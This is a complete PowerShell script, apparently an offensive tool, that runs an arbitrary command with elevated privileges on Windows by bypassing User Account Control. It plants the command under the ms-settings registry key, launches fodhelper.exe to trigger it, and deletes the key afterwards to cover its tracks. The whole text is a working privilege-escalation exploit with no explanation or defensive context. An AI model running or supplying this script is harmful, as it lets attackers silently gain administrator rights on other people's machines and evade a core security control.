$cmd = $Args[0]

#add command into registry process 
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "$cmd" -Force
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force

#start fodhelper.exe to execute command in the registry
Start-Process "C:\Windows\System32\fodhelper.exe"

#sleep 1 sec to prevent some weird popup occurs & caused code execution fails
sleep(1)    

#cleanup created registry value
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force